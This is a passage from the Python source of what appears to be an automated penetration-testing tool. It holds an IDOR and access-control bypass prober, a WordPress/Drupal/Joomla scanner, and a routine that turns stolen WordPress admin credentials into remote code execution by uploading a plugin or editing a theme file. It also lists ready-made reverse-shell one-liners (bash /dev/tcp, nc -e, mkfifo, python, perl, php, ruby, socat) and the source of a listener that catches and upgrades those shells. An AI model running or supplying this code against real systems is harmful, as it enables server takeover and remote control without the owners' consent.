                    pw = "" if mc.group(2) == "<blank>" else mc.group(2)
                    kind = "Basic" if "basic" in mc.group(4).lower() else "form"
                    out.append((host, mc.group(3), kind, mc.group(1), pw))
    return out


def _tool_idor_bac(ip: str, port: int, proto: str) -> str:
    """HTTP step-23 tool: hunt IDOR / broken access control, read-only. (1) Force-browse
    privileged paths unauthenticated → flag privileged 200s. (2) Retry 401/403 paths with
    header / path / safe-method bypass vectors. (3) Enumerate ID-bearing endpoints and flag
    when neighbouring IDs return distinct records carrying PII (gated to keep FPs low). If
    default-creds found a valid login, it re-authenticates and re-runs the ID enumeration with
    that session (the strongest IDOR signal). Only GET/HEAD/OPTIONS — never PUT/DELETE/POST with
    a body — so nothing on the target is mutated. Stdlib only; a dead server raises."""
    import http.client
    import ssl
    import time
    import base64
    import urllib.parse

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()

    def _req(hostval, method, path, body=None, extra=None):
        conn = None
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_IDOR_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_IDOR_REQ_TIMEOUT)
            hdr = {"Host": hostval, "User-Agent": "pshunter"}
            if extra:
                hdr.update(extra)
            conn.request(method, path, body=body, headers=hdr)
            resp = conn.getresponse()
            data = resp.read(131072).decode("utf-8", "replace")
            return resp.status, data, (resp.headers.get_all("Set-Cookie") or [])
        except Exception:                                     # noqa: BLE001
            return None, None, []
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    def _set_param(path, param, value):
        pr = urllib.parse.urlparse(path)
        pairs = [(k, v) for k, v in urllib.parse.parse_qsl(pr.query) if k != param]
        pairs.append((param, value))
        return pr.path + "?" + urllib.parse.urlencode(pairs)

    def _similar(a, b):
        a, b = a or "", b or ""
        if not b:
            return not a
        return abs(len(a) - len(b)) <= max(48, int(len(b) * 0.06))

    _bcache = {}

    def _baseline(host):
        if host not in _bcache:
            _, hb, _ = _req(host, "GET", "/")
            rnd = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=10))
            _, nb, _ = _req(host, "GET", "/pshx" + rnd)
            _bcache[host] = (hb or "", nb or "")
        return _bcache[host]

    if _req(ip, "GET", "/")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test IDOR/BAC")

    deadline = time.time() + _IDOR_DEADLINE
    idor, bac, authz, enum = [], [], [], []

    def _bypass_vectors(p):
        no_slash = p.rstrip("/")
        return [
            ("X-Forwarded-For 127.0.0.1", "GET", p, {"X-Forwarded-For": "127.0.0.1"}),
            ("X-Custom-IP-Authorization", "GET", p, {"X-Custom-IP-Authorization": "127.0.0.1"}),
            ("X-Forwarded-Host localhost", "GET", p, {"X-Forwarded-Host": "localhost"}),
            ("X-Original-URL", "GET", "/", {"X-Original-URL": p}),
            ("X-Rewrite-URL", "GET", "/", {"X-Rewrite-URL": p}),
            ("trailing slash", "GET", (no_slash + "/") if not p.endswith("/") else p, {}),
            ("dot-segment /%2e", "GET", no_slash + "/%2e", {}),
            ("OPTIONS method", "OPTIONS", p, {}),
        ]

    def _enum_endpoint(ep, extra):
        kind = ep[0]
        if kind == "param":
            _k, host, base, param, orig, label = ep

            def build(nid):
                return _set_param(base, param, str(nid))
        else:
            _k, host, pre, suf, orig, label = ep

            def build(nid):
                return f"{pre}{nid}{suf}"
        o_st, o_body, _c = _req(host, "GET", build(orig), extra=extra)
        if o_st != 200 or not o_body:
            return None, host, label
        b_st, b_body, _c = _req(host, "GET", build(99999999), extra=extra)
        b_len = len(b_body or "")
        recs = []
        for nid in dict.fromkeys(i for i in (1, 2, 3, orig - 1, orig + 1, orig + 2)
                                 if i > 0 and i != orig):
            if time.time() >= deadline:
                break
            st, body, _c = _req(host, "GET", build(nid), extra=extra)
            if st == 200 and body and (b_st != 200 or
                                       abs(len(body) - b_len) > max(64, int(b_len * 0.05))):
                recs.append((nid, body))
        pii = {}
        for nid, body in recs:
            if _PII_RE.search(body):
                pii[hash(body)] = nid                        # distinct bodies → distinct records
        if len(pii) >= 2:
            return "idor", host, f"{label} (IDs {sorted(pii.values())} → distinct PII records)"
        if len({hash(b) for _n, b in recs}) >= 2:
            return "enum", host, f"{label} (IDs enumerable, no PII)"
        return None, host, label

    # ── Technique 1+2: forced browsing + 401/403 bypass ──
    for host, path, _dstatus in _gather_priv_paths(ip, port, proto):
        if time.time() >= deadline:
            break
        _home, notfound = _baseline(host)
        st, body, _c = _req(host, "GET", path)               # unauthenticated
        is_login = bool(body and re.search(r"type=[\"']?password", body, re.I))
        if st == 200 and body and _PRIV_CONTENT_RE.search(body) and not is_login \
                and not _similar(body, notfound):
            bac.append(f"  ✗ BAC {host}{path}  (unauth 200 → privileged content)")
            continue
        if st in (401, 403):
            home_body = _baseline(host)[0]
            for vlabel, method, vpath, extra in _bypass_vectors(path):
                if time.time() >= deadline:
                    break
                bst, bbody, _c = _req(host, method, vpath, extra=extra)
                if bst == 200 and bbody and len(bbody) > 64 \
                        and not re.search(r"type=[\"']?password", bbody, re.I) \
                        and not _similar(bbody, home_body):
                    authz.append(f"  ✗ AUTHZ-BYPASS {host}{path}  (via {vlabel})")
                    break

    # ── Technique 3: IDOR enumeration (unauthenticated) ──
    id_eps = _gather_id_endpoints(ip, port, proto)
    flagged = set()
    for ep in id_eps:
        if time.time() >= deadline:
            break
        verdict, host, detail = _enum_endpoint(ep, None)
        if verdict == "idor":
            idor.append(f"  ✗ IDOR {host}{detail}")
            flagged.add((host, detail.split()[0]))
        elif verdict == "enum":
            enum.append(f"  ⚠ ENUM {host}{detail}")

    # ── Credentialed layer: re-login and re-run enumeration as an authenticated user ──
    creds_used = None
    if time.time() < deadline:
        for chost, cpath, kind, u, p in _parse_valid_creds(ip, port, proto):
            auth_extra = None
            if kind == "Basic":
                auth_extra = {"Authorization": "Basic " + base64.b64encode(
                    f"{u}:{p}".encode()).decode()}
            else:
                gs, gbody, gsc = _req(chost, "GET", cpath)
                form = _parse_login_form(gbody or "", cpath)
                if form:
                    data = dict(form["hidden"])
                    data[form["user"]] = u
                    data[form["pass"]] = p
                    action = urllib.parse.urljoin(f"{scheme}://{ip}:{port}{cpath}",
                                                  form["action"] or cpath)
                    pr = urllib.parse.urlparse(action)
                    apath = pr.path + (f"?{pr.query}" if pr.query else "")
                    gcookie = "; ".join(c.split(";")[0] for c in gsc)
                    ex = {"Content-Type": "application/x-www-form-urlencoded"}
                    if gcookie:
                        ex["Cookie"] = gcookie
                    _st, _b, setc = _req(chost, "POST", apath,
                                         body=urllib.parse.urlencode(data), extra=ex)
                    session = "; ".join(c.split(";")[0] for c in setc) or gcookie
                    if setc and session:
                        auth_extra = {"Cookie": session}
            if not auth_extra:
                continue
            creds_used = f"{u}:{p or '<blank>'}@{chost}{cpath}"
            for ep in id_eps:
                if time.time() >= deadline:
                    break
                if ep[1] != chost:
                    continue
                verdict, host, detail = _enum_endpoint(ep, auth_extra)
                if verdict == "idor" and (host, detail.split()[0]) not in flagged:
                    idor.append(f"  ✗ IDOR {host}{detail}  [authenticated as {u}]")
                    flagged.add((host, detail.split()[0]))
            break

    reason = "deadline" if time.time() >= deadline else "complete"
    lines = [f"{scheme}://{ip}:{port}/ IDOR / broken access control probe",
             f"priv paths + id endpoints scanned · IDOR {len(idor)} · BAC {len(bac)} · "
             f"authz-bypass {len(authz)} · enum {len(enum)} · {reason}"
             + (f" · creds: {creds_used}" if creds_used else "")]
    if idor:
        lines.append("\nIDOR (other objects' data reachable):")
        lines += idor
    if bac:
        lines.append("\nBROKEN ACCESS CONTROL (privileged page unauthenticated):")
        lines += bac
    if authz:
        lines.append("\n401/403 AUTHZ BYPASS:")
        lines += authz
    if enum and not idor:
        lines.append("\nENUMERABLE OBJECTS (no PII gate — verify manually):")
        lines += enum
    if not (idor or bac or authz or enum):
        lines.append("\nno IDOR / access-control issue confirmed")
    return "\n".join(lines)


# ── HTTP step 24: CMS-specific scan (wpscan / droopescan orchestrator + stdlib fallback) ──
_CMS_DEADLINE = 300
_CMS_REQ_TIMEOUT = 10
_CMS_SCAN_TIMEOUT = 240        # per external scanner
_CMS_MAX_PLUGINS = 25
_WP_TOP_PLUGINS = [
    "akismet", "contact-form-7", "woocommerce", "elementor", "wordpress-seo", "jetpack",
    "wpforms-lite", "wordfence", "all-in-one-seo-pack", "wp-super-cache", "w3-total-cache",
    "really-simple-ssl", "updraftplus", "classic-editor", "mailchimp-for-wp", "redirection",
    "google-site-kit", "ninja-forms", "advanced-custom-fields", "wp-file-manager",
    "ithemes-security", "backwpup", "duplicate-post", "loginizer", "revslider",
]


def _detect_cms(blob: str) -> tuple:
    """Best-effort CMS + version from a fingerprint blob (services + http-* output + homepage).
    Ordered so the strongest signature wins. Returns (cms|None, version|None)."""
    low = (blob or "").lower()
    if re.search(r"wp-content|wp-json|wp-login|wordpress", low):
        m = re.search(r"wordpress[ /]?(\d+\.\d+(?:\.\d+)?)", low)
        return "wordpress", (m.group(1) if m else None)
    if re.search(r"x-generator:\s*drupal|\bdrupal\b|sites/default|/core/misc/drupal", low):
        m = re.search(r"drupal[ /]?(\d+(?:\.\d+)+)", low)
        return "drupal", (m.group(1) if m else None)
    if re.search(r"\bjoomla\b|/administrator/|com_content|/media/system/js", low):
        m = re.search(r"joomla![ /]?(\d+(?:\.\d+)+)", low)
        return "joomla", (m.group(1) if m else None)
    for nm in ("magento", "typo3", "moodle", "mediawiki", "prestashop", "opencart", "ghost"):
        if nm in low:
            m = re.search(nm + r"[ /]?(\d+(?:\.\d+)+)", low)
            return nm, (m.group(1) if m else None)
    return None, None


def _parse_wpscan_json(data: dict) -> tuple:
    """(version, [vuln lines], [component lines], [users]) from wpscan --format json output."""
    def _cves(v):
        cs = ((v.get("references") or {}).get("cve") or [])
        return " ".join((c if str(c).upper().startswith("CVE") else "CVE-" + str(c)) for c in cs)

    core = data.get("version") or {}
    ver = core.get("number")
    vulns, items, users = [], [], []
    for v in (core.get("vulnerabilities") or []):
        vulns.append(f"core {ver or '?'}: {v.get('title', '?')} {_cves(v)}".strip())
    for section in ("plugins", "themes"):
        for name, info in (data.get(section) or {}).items():
            pv = ((info.get("version") or {}) or {}).get("number")
            vs = info.get("vulnerabilities") or []
            if vs:
                for v in vs:
                    vulns.append(f"{section[:-1]} {name} {pv or '?'}: "
                                 f"{v.get('title', '?')} {_cves(v)}".strip())
            else:
                items.append(f"{section[:-1]} {name}{(' ' + pv) if pv else ''}")
    mt = data.get("main_theme") or {}
    if mt.get("slug"):
        pv = (mt.get("version") or {}).get("number")
        for v in (mt.get("vulnerabilities") or []):
            vulns.append(f"theme {mt.get('slug')} {pv or '?'}: {v.get('title', '?')} {_cves(v)}".strip())
    for u in (data.get("users") or {}):
        users.append(u)
    return ver, vulns, items, users


def _parse_droopescan(out: str) -> tuple:
    """(versions, [component lines]) from droopescan text output. No CVE data — enumeration only."""
    versions = []
    m = re.search(r"Possible version\(s\):\s*\n((?:[ \t]+\S+\n)+)", out or "")
    if m:
        versions = re.findall(r"[ \t]+([\d][\w.]*)", m.group(1))
    items = []
    for sec in re.finditer(r"\[\+\] ([A-Za-z ]+?) identified[^\n]*:\n"
                           r"((?:[ \t]+http\S+\n?)+)", out or ""):
        label = sec.group(1).strip()
        for u in re.findall(r"[ \t]+(http\S+)", sec.group(2)):
            items.append(f"{label}: {u}")
    return versions, items


def _tool_cms_scan(ip: str, port: int, proto: str) -> str:
    """HTTP step-24 tool: fingerprint the CMS, then run its matching external scanner if
    installed (wpscan for WordPress, droopescan for Drupal/Joomla) to surface vulnerable
    plugins/themes/versions and users; otherwise fall back to a stdlib enumeration (version
    files, wp-json user list, common plugin readmes). Read-only — no exploitation or brute
    force. wpscan CVE data needs WPSCAN_API_TOKEN (env). Stdlib only for the fallback; a dead
    server raises."""
    import http.client
    import ssl
    import time
    import urllib.parse

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()

    def _req(path, extra=None):
        conn = None
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_CMS_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_CMS_REQ_TIMEOUT)
            hdr = {"Host": ip, "User-Agent": "pshunter"}
            if extra:
                hdr.update(extra)
            conn.request("GET", path, headers=hdr)
            resp = conn.getresponse()
            return resp.status, resp.read(200000).decode("utf-8", "replace"), resp.headers
        except Exception:                                     # noqa: BLE001
            return None, None, None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    # fingerprint blob: services + earlier http-* output + live homepage
    blob = ""
    for (nm, prod, ver, cpe) in fetch_services(ip).values():
        blob += " ".join(x for x in (nm, prod, cpe) if x) + " "
    for sid, output in fetch_scripts(ip, port, proto):
        if sid in ("http-fingerprint", "http-headers", "http-source", "dir-brute"):
            blob += " " + (output or "")
    st, body, hdrs = _req("/")
    if st is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot CMS-scan")
    blob += " " + (body[:20000] if body else "")
    if hdrs:
        for k in ("Server", "X-Powered-By", "X-Generator", "Link"):
            hv = hdrs.get(k)
            if hv:
                blob += f" {k}: {hv}"

    cms, ver = _detect_cms(blob)
    base = f"{scheme}://{ip}:{port}/"
    deadline = time.time() + _CMS_DEADLINE
    if not cms:
        return (f"{scheme}://{ip}:{port}/ CMS scan\n"
                "no CMS fingerprinted (WordPress / Drupal / Joomla / …)")

    vulns, items, users, notes = [], [], [], []
    engine = "stdlib fallback"

    if cms == "wordpress" and shutil.which("wpscan"):
        engine = "wpscan"
        cmd = ["wpscan", "--url", base, "--no-banner", "--format", "json",
               "--enumerate", "vp,vt,u", "--random-user-agent", "--disable-tls-checks",
               "--request-timeout", "20", "--connect-timeout", "10"]
        tok = os.environ.get("WPSCAN_API_TOKEN")
        if tok:
            cmd += ["--api-token", tok]
        else:
            notes.append("no WPSCAN_API_TOKEN — enumeration only, no CVE mapping")
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=_CMS_SCAN_TIMEOUT)
            data = json.loads(proc.stdout or "{}")
            wver, vulns, items, users = _parse_wpscan_json(data)
            ver = wver or ver
        except subprocess.TimeoutExpired:
            notes.append("wpscan timed out (partial/none)")
        except Exception as exc:                              # noqa: BLE001
            notes.append(f"wpscan parse failed: {exc}")
    elif cms in ("drupal", "joomla", "silverstripe") and shutil.which("droopescan"):
        engine = "droopescan"
        try:
            proc = subprocess.run(["droopescan", "scan", cms, "-u", base, "-t", "8"],
                                  capture_output=True, text=True, timeout=_CMS_SCAN_TIMEOUT)
            versions, items = _parse_droopescan(proc.stdout or "")
            if versions:
                ver = versions[0]
                if len(versions) > 1:
                    notes.append("droopescan version candidates: " + ", ".join(versions[:5]))
        except subprocess.TimeoutExpired:
            notes.append("droopescan timed out (partial/none)")
        except Exception as exc:                              # noqa: BLE001
            notes.append(f"droopescan failed: {exc}")

    if engine == "stdlib fallback":
        notes.append("external scanner not installed — stdlib fallback (versions + user enum)")
        if cms == "wordpress":
            for p in ("/readme.html", "/wp-includes/version.php"):
                s, b, _h = _req(p)
                if s == 200 and b:
                    m = re.search(r"[Vv]ersion\s+(\d+\.\d+(?:\.\d+)?)", b)
                    if m:
                        ver = ver or m.group(1)
            s, b, _h = _req("/wp-json/wp/v2/users")
            if not (s == 200 and b and b.lstrip().startswith("[")):
                s, b, _h = _req("/?rest_route=/wp/v2/users")
            if s == 200 and b and b.lstrip().startswith("["):
                users += re.findall(r'"slug":"([^"]+)"', b)
            for pl in _WP_TOP_PLUGINS[:_CMS_MAX_PLUGINS]:
                if time.time() >= deadline:
                    break
                s, b, _h = _req(f"/wp-content/plugins/{pl}/readme.txt")
                if s == 200 and b and re.search(r"stable tag", b, re.I):
                    pm = re.search(r"[Ss]table tag:\s*([\w.]+)", b)
                    items.append(f"plugin {pl}{(' ' + pm.group(1)) if pm else ''}")
        elif cms == "drupal":
            for p in ("/CHANGELOG.txt", "/core/CHANGELOG.txt"):
                s, b, _h = _req(p)
                if s == 200 and b:
                    m = re.search(r"Drupal (\d+\.\d+(?:\.\d+)?)", b)
                    if m:
                        ver = ver or m.group(1)
        elif cms == "joomla":
            for p in ("/administrator/manifests/files/joomla.xml",
                      "/language/en-GB/en-GB.xml"):
                s, b, _h = _req(p)
                if s == 200 and b:
                    m = re.search(r"<version>([\d.]+)</version>", b)
                    if m:
                        ver = ver or m.group(1)

    lines = [f"{scheme}://{ip}:{port}/ CMS scan",
             f"CMS: {cms}{(' ' + ver) if ver else ' (version unknown)'}",
             f"engine: {engine}"]
    for n in notes:
        lines.append(f"note: {n}")
    if vulns:
        lines.append("\nVULNERABILITIES:")
        lines += [f"  ✗ CMS-VULN {v}" for v in vulns]
    if items:
        lines.append("\nCOMPONENTS:")
        lines += [f"  {it}" for it in sorted(set(items))]
    if users:
        lines.append("\nUSERS:")
        lines.append(f"  ⚠ CMS-USERS " + ", ".join(sorted(set(users))[:20]))
    if not (vulns or items or users):
        lines.append("\nno components / vulns enumerated")
    return "\n".join(lines)


# ── HTTP step 25: Admin panel → RCE (WordPress; creds-gated, inert, reversible) ──
_ADMINRCE_DEADLINE = 200
_ADMINRCE_REQ_TIMEOUT = 12


def _wp_nonce(html: str, field: str = "_wpnonce") -> "str | None":
    """Pull a WordPress nonce value out of a hidden input, either attribute order."""
    m = (re.search(rf'(?:id|name)="{field}"[^>]*value="([^"]+)"', html or "")
         or re.search(rf'value="([^"]+)"[^>]*(?:id|name)="{field}"', html or ""))
    return m.group(1) if m else None


def _tool_admin_rce(ip: str, port: int, proto: str) -> str:
    """HTTP step-25 tool: turn valid admin credentials into code execution through a WordPress
    admin panel — upload a tiny plugin (primary) or edit an inactive theme file (fallback). The
    payload is INERT (echoes a unique marker × arithmetic, no live shell); success is proven by
    fetching the dropped file back. It is REVERSIBLE: the plugin is deleted / the theme file is
    restored, and anything left behind is listed for manual removal. Gated on credentials found
    by default-creds / login-brute — it will not run blind. Authorised targets only: this writes
    executable code to the target. Stdlib only; a dead server raises."""
    import http.client
    import ssl
    import time
    import io
    import zipfile
    import urllib.parse

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()
    base = f"{scheme}://{ip}:{port}/"

    def _req(hostval, method, path, body=None, extra=None):
        conn = None
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_ADMINRCE_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_ADMINRCE_REQ_TIMEOUT)
            hdr = {"Host": hostval, "User-Agent": "pshunter"}
            if extra:
                hdr.update(extra)
            conn.request(method, path, body=body, headers=hdr)
            resp = conn.getresponse()
            data = resp.read(300000).decode("utf-8", "replace")
            return (resp.status, data, resp.headers.get_all("Set-Cookie") or [],
                    resp.getheader("Location"))
        except Exception:                                     # noqa: BLE001
            return None, None, [], None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    def _merge(jar, setc):
        for c in setc:
            nv = c.split(";", 1)[0].strip()
            if "=" in nv:
                jar[nv.split("=", 1)[0]] = nv
        return "; ".join(jar.values())

    def _wp_login(hostval, u, p):
        jar = {}
        _s, _b, setc, _l = _req(hostval, "GET", "/wp-login.php")
        cookie = _merge(jar, setc)
        body = urllib.parse.urlencode({"log": u, "pwd": p, "wp-submit": "Log In",
                                       "redirect_to": base + "wp-admin/", "testcookie": "1"})
        ex = {"Content-Type": "application/x-www-form-urlencoded",
              "Cookie": (cookie + "; " if cookie else "") + "wordpress_test_cookie=WP+Cookie+check"}
        _s, _b, setc, _l = _req(hostval, "POST", "/wp-login.php", body=body, extra=ex)
        cookie = _merge(jar, setc)
        if "wordpress_logged_in" in cookie:
            return cookie
        st, b, setc, _l = _req(hostval, "GET", "/wp-admin/", extra={"Cookie": cookie})
        if st == 200 and b and "dashboard" in b.lower():
            return _merge(jar, setc)
        return None

    # ── confirm WordPress ──
    blob = ""
    for sid, output in fetch_scripts(ip, port, proto):
        if sid in ("http-fingerprint", "http-headers", "http-source", "dir-brute"):
            blob += " " + (output or "")
    st, hb, _sc, _l = _req(ip, "GET", "/")
    if st is None:
        raise RuntimeError(f"{base} unreachable — cannot attempt admin RCE")
    blob += " " + (hb[:20000] if hb else "")
    cms, _ver = _detect_cms(blob)
    if cms != "wordpress":
        return (f"{base} admin-panel RCE\n"
                f"CMS is {cms or 'unknown'} — only WordPress is automated here; "
                "exploit the admin panel manually (upload plugin/theme, edit a template)")

    # ── need working admin creds ──
    creds = [c for c in _parse_valid_creds(ip, port, proto) if c[2] == "form"]
    if not creds:
        return (f"{base} admin-panel RCE\n"
                "no admin credentials available — run default-creds / login-brute first")

    session = None
    for chost, _cpath, _kind, u, p in creds:
        cookie = _wp_login(chost, u, p)
        if cookie:
            session = (chost, cookie, u, p)
            break
    if not session:
        return (f"{base} admin-panel RCE\n"
                "found credentials but none logged into wp-admin (form may differ) — verify manually")

    host, cookie, user, _pw = session
    token = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8))
    slug = "psh" + token
    mark = "PSHADM" + token
    a, b = random.randint(1000, 9999), random.randint(1000, 9999)
    product = str(a * b)
    payload = f"<?php echo '{mark}',{a}*{b},'{mark}'; ?>"
    rce, artifacts, tried = [], [], []
    ck = {"Cookie": cookie}

    # ── primary: upload a tiny plugin ──
    st, b_html, _sc, _l = _req(host, "GET", "/wp-admin/plugin-install.php?tab=upload", extra=ck)
    nonce = _wp_nonce(b_html or "")
    if nonce:
        tried.append("plugin upload")
        php = (f"<?php\n/*\nPlugin Name: {slug}\nVersion: 0.0\n*/\n"
               f"echo '{mark}',{a}*{b},'{mark}';\n")
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr(f"{slug}/{slug}.php", php)
        body, boundary = _multipart({"_wpnonce": nonce, "install-plugin-submit": "Install Now"},
                                    "pluginzip", f"{slug}.zip", "application/zip", buf.getvalue())
        _req(host, "POST", "/wp-admin/update.php?action=upload-plugin", body=body,
             extra={"Cookie": cookie, "Content-Type": f"multipart/form-data; boundary={boundary}"})
        vpath = f"/wp-content/plugins/{slug}/{slug}.php"
        vst, vbody, _sc, _l = _req(host, "GET", vpath)
        if vst is not None and vbody and f"{mark}{product}{mark}" in vbody:
            rce.append(f"  ✗ ADMIN-RCE {scheme}://{host}:{port}{vpath}  (wordpress: plugin upload)")
            # best-effort cleanup: bulk-delete the plugin
            gs, gb, _s, _l = _req(host, "GET", "/wp-admin/plugins.php", extra=ck)
            dnonce = _wp_nonce(gb or "", "_wpnonce")
            deleted = False
            if dnonce:
                dbody = urllib.parse.urlencode({"action": "delete-selected",
                                                "checked[]": f"{slug}/{slug}.php",
                                                "_wpnonce": dnonce, "verify-delete": "1"})
                _req(host, "POST", "/wp-admin/plugins.php", body=dbody,
                     extra={"Cookie": cookie,
                            "Content-Type": "application/x-www-form-urlencoded"})
                cst, _cb, _s, _l = _req(host, "GET", vpath)
                deleted = (cst == 404)
            if not deleted:
                artifacts.append(f"{host}{vpath}  (plugin '{slug}' — delete in wp-admin/plugins)")

    # ── fallback: edit an inactive theme's file ──
    if not rce:
        st, te, _sc, _l = _req(host, "GET", "/wp-admin/theme-editor.php", extra=ck)
        if st == 200 and te:
            tried.append("theme editor")
            tnonce = _wp_nonce(te, "_wpnonce")
            theme = re.search(r'name="theme"[^>]*value="([^"]+)"', te) or \
                re.search(r'theme=([^"&]+)&(?:amp;)?file=', te)
            phpfile = re.search(r'file=([^"&]+\.php)', te)
            m_orig = re.search(r'<textarea[^>]*id="newcontent"[^>]*>(.*?)</textarea>', te, re.S)
            if tnonce and theme and phpfile:
                tval, fval = theme.group(1), phpfile.group(1)
                orig = m_orig.group(1) if m_orig else ""
                new = (orig or "") + "\n" + payload
                post = urllib.parse.urlencode({"_wpnonce": tnonce, "newcontent": new,
                                               "action": "update", "file": fval, "theme": tval,
                                               "submit": "Update File"})
                est, _eb, _s, _l = _req(host, "POST", "/wp-admin/theme-editor.php", body=post,
                                        extra={"Cookie": cookie,
                                               "Content-Type": "application/x-www-form-urlencoded"})
                vpath = f"/wp-content/themes/{tval}/{fval}"
                vst, vbody, _sc, _l = _req(host, "GET", vpath)
                if vst is not None and vbody and f"{mark}{product}{mark}" in vbody:
                    rce.append(f"  ✗ ADMIN-RCE {scheme}://{host}:{port}{vpath}  "
                               f"(wordpress: theme edit {fval})")
                if est in (200, 302):                        # we wrote → always restore the original
                    restore = urllib.parse.urlencode({"_wpnonce": tnonce, "newcontent": orig,
                                                       "action": "update", "file": fval,
                                                       "theme": tval, "submit": "Update File"})
                    _req(host, "POST", "/wp-admin/theme-editor.php", body=restore,
                         extra={"Cookie": cookie,
                                "Content-Type": "application/x-www-form-urlencoded"})
                    rst, rb, _s, _l = _req(host, "GET", vpath)
                    if rst is not None and rb and f"{mark}{product}{mark}" in rb:
                        artifacts.append(f"{host}{vpath}  (theme file — restore failed, revert manually)")

    lines = [f"{base} admin-panel RCE (WordPress)",
             f"logged in as {user} · tried: {', '.join(tried) or 'none'} · RCE {len(rce)}"]
    if rce:
        lines.append("\nAUTHENTICATED ADMIN → RCE:")
        lines += rce
    if artifacts:
        lines.append("\nartifacts to remove:")
        lines += [f"  {x}" for x in artifacts]
    if not rce:
        lines.append("\nno admin→RCE path succeeded (nonce/permissions?) — try manually")
    return "\n".join(lines)


# ── HTTP step 26: foothold — spawn & auto-upgrade a reverse shell via a confirmed RCE channel ──
_FOOTHOLD_ENUM_TOOLS = ["python3", "python", "socat", "nc", "ncat", "perl", "php", "ruby", "bash",
                        "script"]
# (label, interpreter it needs, reverse-shell payload with {ip}/{port}, already-interactive-pty?)
_REVSHELLS = [
    ("python3 pty", "python3",
     "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));"
     "[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'", True),
    ("python pty", "python",
     "python -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));"
     "[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'", True),
    ("socat pty", "socat",
     "socat tcp:{ip}:{port} exec:'bash -li',pty,stderr,setsid,sigint,sane", True),
    ("bash /dev/tcp", "bash", "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'", False),
    ("nc -e", "nc", "nc {ip} {port} -e /bin/bash", False),
    ("nc mkfifo", "nc",
     "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f", False),
    ("perl", "perl",
     "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
     "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");"
     "open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'", False),
    ("php", "php",
     "php -r '$s=fsockopen(\"{ip}\",{port});proc_open(\"/bin/bash -i\","
     "array(0=>$s,1=>$s,2=>$s),$p);'", False),
    ("ruby", "ruby",
     "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;"
     "exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'", False),
]
# self-selecting TTY upgrade sent to a dumb shell on connect: python3 → python → script → bash
_FOOTHOLD_UPGRADE = (
    "(command -v python3>/dev/null&&exec python3 -c 'import pty;pty.spawn(\"/bin/bash\")');"
    "(command -v python>/dev/null&&exec python -c 'import pty;pty.spawn(\"/bin/bash\")');"
    "(command -v script>/dev/null&&exec script -qc /bin/bash /dev/null);exec /bin/bash\n")

_SMART_LISTENER_SRC = r'''
import socket, sys, os, select, time
LPORT = __LPORT__
UPGRADE = __UPGRADE__
srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", LPORT)); srv.listen(1)
sys.stdout.write("[*] pshunter listener on 0.0.0.0:%d - waiting for the target...\n" % LPORT)
sys.stdout.flush()
conn, addr = srv.accept()
sys.stdout.write("[+] shell from %s:%d\n" % addr); sys.stdout.flush()
try:
    cols, rows = os.get_terminal_size()
except Exception:
    cols, rows = 120, 30
if UPGRADE:
    conn.sendall(UPGRADE); time.sleep(0.6)
conn.sendall(("stty rows %d cols %d 2>/dev/null; export TERM=xterm-256color; "
              "export SHELL=/bin/bash\n" % (rows, cols)).encode())
old = None
try:
    import termios, tty
    old = termios.tcgetattr(0); tty.setraw(0)
except Exception:
    pass
try:
    while True:
        r, _, _ = select.select([0, conn], [], [])
        if 0 in r:
            d = os.read(0, 1024)
            if not d:
                break
            conn.sendall(d)
        if conn in r:
            d = conn.recv(4096)
            if not d:
                break
            os.write(1, d)
finally:
    if old is not None:
        try:
            termios.tcsetattr(0, termios.TCSADRAIN, old)
        except Exception:
            pass
    conn.close()
sys.stdout.write("\n[*] session closed - press enter to close this tab\n")
try:
    input()
except Exception:
    pass
'''


def _parse_cmdi_vectors(ip: str, port: int, proto: str) -> list:
    """(host, path, param, kind, label) confirmed command-injection vectors recorded by
